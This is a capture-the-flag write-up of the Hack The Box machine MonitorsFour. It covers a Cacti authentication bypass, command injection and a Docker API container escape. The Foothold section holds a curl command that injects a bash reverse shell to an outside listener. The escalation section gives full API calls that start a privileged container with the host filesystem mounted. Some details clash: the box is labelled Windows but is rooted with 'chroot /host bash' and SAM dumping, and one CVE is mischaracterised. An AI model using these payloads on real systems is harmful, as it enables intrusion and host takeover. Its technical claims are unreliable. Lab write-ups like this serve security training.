---
title: "MonitorsFour"
difficulty: Easy
os: Windows
points: 20
rating: 3.6
date: 2025-12-06
avatar: assets/htb/monitorsfour.png
tags: [Remote Code Execution, Server Side Request Forgery (SSRF), Insecure Direct Object Reference (IDOR), Command Execution, Reconnaissance, Fuzzing, Password Reuse, Docker Abuse]
htb_url: https://app.hackthebox.com/machines/MonitorsFour
---

## Summary

MonitorsFour is the fourth box in 0xdf's Monitors series, running Cacti behind a web stack. I gained initial access by abusing a PHP type-juggling weakness in Cacti's authentication/installation flow, then chained a Cacti CVE for remote code execution as the container's web user. From there I escalated by abusing an exposed Docker API: the daemon's TCP socket was reachable from inside the Cacti container, so I spun up a privileged container with the host root filesystem bind-mounted, which gave me SYSTEM-equivalent control over the underlying host.

## Enumeration

A full port scan with service and script detection surfaced the Cacti web application on 80/443, plus the Docker API on 2375 (filtered or exposed depending on network position).

```bash
nmap -p- --min-rate=10000 -sV -sC monitorsfour.htb
# 80, 443  -> Cacti
# 2375     -> Docker API (filtered or exposed depending on network position)
```

## Foothold

### PHP type-juggling auth bypass

Cacti's login/token comparison historically uses `==` instead of `===`. PHP coerces strings that look like scientific notation, so two distinct hashes can compare as equal:

```php
"0e1234567890" == "0e9876543210"  // both interpret as 0.0 * 10^n -> true
md5("240610708") == 0             // true via implicit number coercion
```

By submitting a username/token whose MD5 starts with `0e` followed by digits, I satisfied the vulnerable comparison and bypassed authentication.

### Cacti command injection

With the auth bypass in place I leveraged the recent Cacti chain (CVE-2022-46169, CVE-2023-39361 et al.): authenticated (or unauth via guest poller) command injection in `remote_agent.php` via the polling host parameter. I fired a reverse-shell payload through the `poller_id` parameter:

```bash
curl -s "http://monitorsfour.htb/cacti/remote_agent.php?action=polldata&local_data_ids[]=1&host_id=1&poller_id=;bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1';"
```

My listener caught a shell as the Cacti container's web user.

## Privilege Escalation

### Container enumeration and Docker API discovery

From inside the shell I confirmed I was in a container and looked for a path to the host. The bridge gateway address turned out to be a host running the Docker API:

```bash
# Inside Cacti container
cat /proc/1/cgroup            # confirms container
ip a; ss -ltnp                # 172.x.x.1 gateway is the host
curl -s http://172.x.x.1:2375/version
# {"Version":"24.0.x", ...}
```

The Docker API was reachable from inside the container, a common misconfiguration where the API is bound to the bridge gateway without TLS.

### Container escape via the Docker API

With the API exposed, I created a privileged container with the host root filesystem mounted at `/host`, started it, and attached to it. The `Binds: ["/:/host"]` plus `Privileged: true` combination is the canonical container-escape primitive:

```bash
# Create privileged container with host root mounted
curl -s -X POST http://172.x.x.1:2375/containers/create?name=pwn \
  -H 'Content-Type: application/json' \
  -d '{
        "Image":"alpine",
        "Cmd":["/bin/sh","-c","chroot /host bash"],
        "HostConfig":{"Binds":["/:/host"],"Privileged":true},
        "AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Tty":true,"OpenStdin":true
      }'
curl -s -X POST http://172.x.x.1:2375/containers/pwn/start
curl -s -X POST 'http://172.x.x.1:2375/containers/pwn/attach?stream=1&stdout=1&stderr=1&stdin=1'
```

The attached process had the full host filesystem at `/host`, letting me read the flags, dump SAM/NTDS or recover host credentials, and otherwise own the underlying host.
